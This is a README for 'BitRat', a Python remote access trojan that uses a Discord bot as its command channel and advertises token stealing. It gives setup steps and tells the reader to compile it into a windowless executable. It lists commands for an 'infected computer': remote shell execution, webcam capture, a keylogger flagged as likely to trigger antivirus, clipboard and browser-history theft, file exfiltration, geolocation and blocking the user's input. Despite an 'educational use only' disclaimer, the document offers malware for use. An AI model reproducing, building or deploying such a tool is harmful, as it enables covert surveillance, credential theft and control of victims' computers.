# BitRat
Python script to create a Rat stealing tokens, etc.

## **Disclaimer:**

This tool is for educational use only, the author will not be held responsible for any misuse of this tool.


# How to use
1. Register a Bot on th discord developer portal and add it to your guild (needs admin perms)
2. Copy the bot token, and paste it at line 16
3. Run the setup.bat to install all the required libraries
4. Then run the BitRat.py and if all previous steps were successfull it should send a message to a new channel on your Guild
5. Your Bot is now ready to be used

**Compiling to exe (optional):**\
If you want to compile the bot to exe you can use PyInstaller.\
Inside the directory of the bot execute 
```
PyInstaller --onefile --noconsole BitRat.py
```
Or 
``` 
python3 -m PyInstaller --onefile --noconsole "BitRat.py"
```
If an error occured during compiling try to import the discord module 
```
PyInstaller --onefile --noconsole --hidden-import=discord BitRat.py
```

## **Modules**
```
Availaible commands are :
--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !shell = Execute a shell command /Syntax  = "!shell whoami"
--> !webcampic = Take a picture from the webcam
--> !windowstart = Start logging current user window (logging is shown in the bot activity)
--> !windowstop = Stop logging current user window 
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !sysinfo = Gives info about infected computer
--> !history = Get computer navigation history
--> !download = Download a file from infected computer
--> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
--> !cd = Changes directory
--> !write = Type your desired sentence on infected computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
--> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
--> !stopkeylogger = Stops keylogger
--> !dumpkeylogger = Dumps the keylog
--> !volumemax = Put volume at 100%
--> !volumezero = Put volume at 0%
--> !idletime = Get the idle time of user's on target computer
--> !sing = Play chosen video in background
--> !stopsing = Stop video playing in background
--> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
--> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
--> !screenshot = Get the screenshot of the user's current screen
--> !exit = Exit program
--> !kill = Kill a session or all sessions except current one / Syntax = "!kill session-3" or "!kill all"
```

# Achievements

- 20 Stars - Realease .exe file
- 50 Stars - Add new grabbing features
- 100 Stars - New User Interface

* To suggest features, create an issue

# Libraries
- discord
- asyncio
- mss
- browserhistory
- pyautogui
- pynput
- pycaw
- pywin32
